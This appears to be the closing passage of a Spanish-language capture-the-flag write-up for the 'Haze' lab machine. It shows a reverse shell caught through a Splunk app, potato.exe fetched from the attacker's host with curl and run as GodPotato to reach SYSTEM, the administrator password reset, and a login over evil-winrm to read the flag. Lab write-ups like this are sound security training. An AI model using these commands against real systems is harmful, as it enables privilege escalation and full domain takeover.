+![Splunk shell](/assets/writeups/haze/5.png)
+
+```bash
+❯ nc -lvnp 443         
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.61 62320
+* enter *
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+ 
+PS C:\Program Files\Splunk\etc\apps\splunk_shells-1.2\bin> ^Z
+[1]  + 13350 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 13350 continued  nc -lvnp 443
+ * enter *
+PS C:\Program Files\Splunk\etc\apps\splunk_shells-1.2\bin> 
+```
+
+Estamos como `haze\alexander.green` y tenemos el `SeImpersonatePrivilege`. Tal como habíamos previsto:
+
+```bat
+PS C:\Program Files\Splunk\etc\apps\splunk_shells-1.2\bin> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+Ahora podemos utilizar [GodPotato](https://github.com/BeichenDream/GodPotato) para escalar privilegios. No podemos utilizar el clásico JuicyPotatoNG ya que se trata de un Windows Server 2022.
+
+```bat
+PS C:\Users\alexander.green\AppData\Local> curl -o potato.exe http://10.10.16.112:8000/potato.exe
+PS C:\Users\alexander.green\AppData\Local> .\potato.exe -cmd "whoami" 
+[*] CombaseModule: 0x140719795404800
+[*] DispatchTable: 0x140719797995848
+[*] UseProtseqFunction: 0x140719797287744
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\bcc98888-9ca8-4218-8676-4a1e4d798361\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000cc02-0f04-ffff-fcaf-9007db9d5584
+[*] DCOM obj OXID: 0x51cfde98c4a7225e
+[*] DCOM obj OID: 0xb188be00660cf12c
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 936 Token:0x772  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3992
+```
+
+Vamos a simplemente cambiarle la contraseña al usuario administrador:
+
+```bat
+PS C:\Users\alexander.green\AppData\Local> .\potato.exe -cmd 'cmd /c net user Administrator Password123!' 
+... [snip]
+The command completed successfully.
+```
+
+```bash
+❯ nxc smb dc01.haze.htb -u Administrator -p 'Password123!'
+SMB         10.10.11.61     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.61     445    DC01             [+] haze.htb\Administrator:Password123! (Pwn3d!)
+```
+
+Ahora podemos entrar por WinRM y tomar la última flag.
+
+```bash
+❯ evil-winrm -i dc01.haze.htb -u Administrator -p 'Password123!'
+Evil-WinRM shell v3.6
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls -Force
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          3/4/2025  11:00 PM            282 desktop.ini
+-ar---         6/27/2025  11:02 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+4fa97c7ca638f39c2079f26b80******
+```
+
+## Extra
+
+En vez de simplemente mirar las ACLs a bajo nivel, podrías también simplemente crearte una cuenta de computadora y de ahí obtener todo lo que necesitas para la enumeración. 
+
